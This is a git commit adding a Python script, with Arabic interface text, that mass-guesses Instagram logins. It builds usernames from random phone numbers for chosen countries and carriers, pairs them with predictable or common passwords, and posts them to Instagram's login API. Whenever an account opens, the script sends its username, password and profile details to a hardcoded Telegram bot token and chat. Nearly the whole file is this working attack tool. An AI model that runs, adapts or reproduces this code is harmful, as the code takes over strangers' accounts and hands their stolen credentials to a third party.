3f2e463db4fbd914796256a2e98a1f5efe35325b
haydar20 <92215923+haydar20@users.noreply.github.com>
2021-10-09 16:16:26 +0300

    Add files via upload

---
+++ Instam.py
@@ -0,0 +1,277 @@
+from time import sleep
+import webbrowser
+import random
+import requests
+from user_agent import generate_user_agent
+import json
+from secrets import token_hex
+import secrets
+import os
+import sys
+import uuid
+from uuid import uuid4
+from time import sleep
+import webbrowser
+import pyfiglet 
+import time
+aa=0
+zz=0
+E = '\033[1;31m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;39m' #ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+Z2 = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;39m' #ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+E1 = '\x1b[1;31m' # احمر
+G1 = '\x1b[1;32m'
+S1 = '\x1b[1;33m'
+Z = '\x1b[2;31m'
+G2 = '\x1b[1;32m'
+E = '\x1b[1;31m'
+G = '\x1b[1;32m'
+S = '\x1b[1;33m'
+import time
+timee=time.asctime()
+print(timee)
+print(X +'بسم الله قاصم الجبارين')
+hunter = pyfiglet.figlet_format("˛⁽㋡₎⇣")
+print(C+'اللهم صل على محمد وآل محمد')
+def j(z):
+    for e in z:
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(1/100)
+j(Y+hunter)
+j(''*90)
+os.system("clear") 
+print(B+'اخترااق صيد الحسابات ـ انستاا فقط ★_★        ') 
+print(Y+'بسم الله الرحمن الرحيم - اللهم صل على محمد وآل محمد')
+def a(z):
+    for e in z:
+     sys.stdout.write(e) 
+     sys.stdout.flush() 
+     sleep(10/10000)
+hunter1 = pyfiglet.figlet_format("   ALnaayif")
+print(C+'شغل التخمين ـ التوكن وبعدين ID')
+def j(z):
+    for e in z:
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0/100)
+j(A+hunter1)
+print('')
+j(Y+''*60)
+sleep(0)
+print(C+'         الأداة مسجلة بالتوكن الأول - الصيد على البوت\t\n') 
+tok=('1376598203:AAG5nFw6GTkDvpCkpJJsjVmFAT18lz5c5Us')
+print(Y+'\nايدي الحساب مسجل         ⇣       \n')
+ID = ('883341195')
+shuger =('1')
+j(''*90)
+print('')
+import time
+t = time.localtime()
+current_time = time.strftime("%o:%o:%o", t)
+print(Y+'1 - in iRan - على إيران\n2 -  Egypt - على مصر\n3 - Jordan - على الإردن\n4 - KsA - على السعودية\n5 - Lebanon - على لبنان\n6 - Syria - على سوريا\n7 -  Kuwait - على الكويت\n8 - Tunisia - على تونس\n9 - Qatar - على قطر\n10 - Yemen - على اليمن\n11 - a على جميع الشركات العراقية\n12 - z 0على زين العراق فقط 123\n13 - asia 0على اسيا العراق فقط 12\n14 - k على كورك العراق فقط 01 \n15 - t الكل ثلاثي على باس واحد \n16 - t الكل رباعي على باس واحد \n17 - jza على الجزائر \n18 - libia على ليبيا\n')
+shuger = ('7')
+start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Start check - بدء الفحص").json()
+id_msg	=(start_msg['result']["message_id"])
+def code_mrko(userQ,password):
+	cookie = secrets.token_hex(8)*2
+	head = {
+        'HOST': "www.instagram.com",
+        'KeepAlive' : 'True',
+        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
+        'Cookie': 'cookie',
+        'Accept' : "*/*",
+        'ContentType' : "application/x-www-form-urlencoded",
+        "X-Requested-With" : "XMLHttpRequest",
+        "X-IG-App-ID": "936619743392459",
+        "X-Instagram-AJAX" : "missing",
+        "X-CSRFToken" : "missing",
+        "Accept-Language" : "en-US,en;q=0.9"
+}
+	url_id = f'https://www.instagram.com/{userQ}/?__a=1'
+	req_id= requests.get(url_id,headers=head).json()
+	name    = str(req_id['graphql']['user']['full_name'])
+	id    = str(req_id['graphql']['user']['id'])
+	followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
+	following    = str(req_id['graphql']['user']['edge_follow']['count'])
+	isp    = str(req_id['graphql']['user']['is_private'])
+	idd    = str(req_id['graphql']['user']['id'])
+	bio    = str(req_id['graphql']['user']['biography'])
+	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
+	ree = re.json()
+	dat = ree['data']
+	shug = (f"""@o_oi3 معلومات الحساب من 📊
+๏ ـــــــــــــــــــــــــــــ
+⌯ 𝐮𝐬𝐞𝐫 - يوزر :- {userQ}
+⌯ 𝐩𝐚𝐬𝐬 - باسوورد :- {password}
+⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 - متابعين 📬:- {followes}
+⌯ 𝐝𝐚𝐭𝐚 - أنشاء :- {dat}
+⌯ 𝐧𝐚𝐦𝐞 - الأسم :- {name}
+⌯ 𝐢𝐝 - ايدي 🌏:- {idd}
+⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 - يتابع :- {following}
+⌯ 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 - بريفت 🗳:- {isp} 
+⌯ 𝐛𝐢𝐨 - بايو :- {bio} 
+⌯ 𝐭𝐢𝐦𝐞 - وقت 📮:- {current_time} 
+๏ ـــــــــــــــــــــــــــــ""")
+	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
+	i = requests.post(tlg)
+	print(G+shug)
+ 
+
+url='https://i.instagram.com/api/v1/accounts/login/'
+
+headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 
+
+             'Accept':'*/*', 
+
+             'Cookie':'missing', 
+
+             'Accept-Encoding':'gzip, deflate', 
+
+             'Accept-Language':'en-US', 
+
+             'X-IG-Capabilities':'3brTvw==', 
+
+             'X-IG-Connection-Type':'WIFI', 
+
+             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
+
+             'Host':'i.instagram.com'}
+
+w = 'https://pastebin.com/raw/w3hRyEB8'
+rss = requests.get(w).text
+if '[VPN]' in rss:
+    pas1 = ("123456789","1122334455","12345678","12344321","11112222","00001111","11223344")
+    uuos = '1234567890qwertyuiopasdfghjklzxcvbnm_'
+    uossr = '780','781','782','783','770','771','772','750','751'
+    zainp = '780','781','782','783'
+    asiap = '770','771','772'
+    korkp = '750','751'
+    user = '1234567890'
+    koit = '55','51','66','96','99','67','51','50','97','94','99','22','98','90','23','59','23','60','97','69','65'
+    ardn = '77','78','79'
+    jzaar = '5','6','7'
+    libia = '91','92','94'
+    soria = '93','94','95','96','99'
+    masr = '10','11','12','15'
+    tyz = '50','55','53','54','56','58','51','57'
+    while True:
+        if shuger == '1':
+            us = str("".join(random.choice(user)for i in range(8)))
+            username = '+9891' + us
+            password = '091' +us 
+        if shuger == '2':
+            us1 = str("".join(random.choice(masr)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(8)))
+            username = '+20' + us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '3':
+            us1 = str("".join(random.choice(ardn)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+962' + us1 + us2
+            password = '0'  +us1 + us2
+        if shuger == '4':
+            us1 = str("".join(random.choice(tyz)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+966' + us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '5':
+            us = str("".join(random.choice(user)for i in range(6)))
+            username = '+961' + us
+            password = '' +us    
+        if shuger == '6':
+            us1 = str("".join(random.choice(soria)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+963'  + us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '7':
+            us1 = str("".join(random.choice(koit)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(6)))
+            username = '+965'  +us1 + us2
+            password = '' +us1 + us2
+        if shuger == '8':
+            us = str("".join(random.choice(user)for i in range(7)))
+            username = '+216' +us
+            password = '' +us   
+        if shuger == '9':
+            us = str("".join(random.choice(user)for i in range(6)))
+            username = '+974' +us
+            password = '' +us   
+        if shuger == '10':
+            us = str("".join(random.choice(user)for i in range(7)))
+            username = '+967' +us
+            password = '' +us
+        if shuger == '11':
+            us1 = str("".join(random.choice(uossr)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+964' +us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '12':
+            us1 = str("".join(random.choice(zainp)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+964' +us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '13':
+            us1 = str("".join(random.choice(asiap)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+964' +us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '14':
+            us1 = str("".join(random.choice(korkp)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+964' +us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '15':
+            us = str("".join(random.choice(uuos)for i in range(3)))
+            username = '' +us
+            password = random.choice(pas1)
+        if shuger == '16':
+            us = str("".join(random.choice(uuos)for i in range(4)))
+            username = '' +us
+            password = random.choice(pas1)
+        if shuger == '17':
+            us1 = str("".join(random.choice(jzaar)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(8)))
+            username = '+213'  +us1 + us2
+            password = '0' +us1 + us2
+        if shuger == '18':
+            us1 = str("".join(random.choice(libia)for i in range(1)))
+            us2 = str("".join(random.choice(user)for i in range(7)))
+            username = '+218'  +us1 + us2
+            password = '0' +us1 + us2
+        uid = str(uuid4())              
+        data = {
+             'uuid':uid, 
+             'password':password, 
+             'username':username, 
+             'device_id':uid, 
+             'from_reg':'false', 
+             '_csrftoken':'missing', 
+             'login_attempt_countn':'0'}
+        req= requests.post(url, headers=headers, data=data)
+        if 'logged_in_user' in req.json():
+            zz+=1
+            userQ = req.json()['logged_in_user']['username']
+            code_mrko(userQ,password)
+        elif '"message":"challenge_required","challenge"' in req.json():
+            print (S+'user : '+username+': passw : '+password)
+        else:
+            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=\nــــــــــــــــــ\nعدد الصيد 📮: - {zz}\nمحاولات فاشلة 🚫: - {aa}\nكامبو 📑: - {password}\nتوقيت 🗳: - {current_time}\nــــــــــــــــــ\n\n ")
+            print (E+'user : '+username+': passw : '+password)
+            aa+=1
